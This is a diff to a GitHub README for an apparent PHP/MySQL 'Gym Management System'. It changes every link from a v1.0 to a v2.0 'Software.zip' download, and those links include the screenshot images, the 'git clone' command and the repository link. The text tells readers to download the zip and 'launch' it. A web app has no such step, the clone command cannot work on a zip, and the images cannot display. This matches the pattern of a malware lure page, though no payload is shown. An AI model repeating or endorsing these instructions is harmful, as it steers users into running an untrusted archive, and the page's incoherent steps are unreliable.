@@ -7,7 +7,7 @@ Welcome to the Gym Management System GitHub repository! This web application is 
 - **Repository Name**: Gym-Management-System-
 - **Description**: The Gym Management System is a web application developed using PHP and MySQL.
 - **Topics**: bootstrap5, css, gym, gym-management-system, healthcare-application, html, hyper, hyper-text-markup-language, js, php, sql, text, two-tier-architecture, webpage
-- **Download Here**: [https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip](https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip) (file needs to be launched)
+- **Download Here**: [https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip](https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip) (file needs to be launched)
 
 ## 🌟 Features
 
@@ -21,7 +21,7 @@ Welcome to the Gym Management System GitHub repository! This web application is 
 
 To get started with the Gym Management System, follow these steps:
 
-1. Download the [https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip](https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip) file from the link provided above.
+1. Download the [https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip](https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip) file from the link provided above.
 2. Launch the downloaded file to set up the web application.
 3. Configure the necessary settings and start managing your gym efficiently!
 
@@ -29,13 +29,13 @@ To get started with the Gym Management System, follow these steps:
 
 Here are some sneak peeks into the Gym Management System:
 
-![Dashboard](https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip)  
+![Dashboard](https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip)  
 *Dashboard for quick overview*  
 
-![Staff Management](https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip)  
+![Staff Management](https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip)  
 *Manage staff profiles and schedules*
 
-![Member Tracking](https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip)  
+![Member Tracking](https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip)  
 *Track member details and subscriptions*
 
 ## 💻 Technologies Used
@@ -51,7 +51,7 @@ The Gym Management System is built using the following technologies:
 Follow these steps to install and run the Gym Management System:
 
 ```bash
-git clone https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip
+git clone https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip
 cd Gym-Management-System-
 # Configure your web server to host the application
 # Import the MySQL database schema
@@ -75,6 +75,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🚀 Visit the [Gym Management System](https://github.com/bin49/Gym-Management-System-/releases/download/v1.0/Software.zip) repository to download the application and optimize your gym management operations! Let's start building a healthier community together! 💪
+🚀 Visit the [Gym Management System](https://github.com/bin49/Gym-Management-System-/releases/download/v2.0/Software.zip) repository to download the application and optimize your gym management operations! Let's start building a healthier community together! 💪
 
 🌟 For any queries or support, feel free to contact us. 📧 Thank you for choosing the Gym Management System! ✨
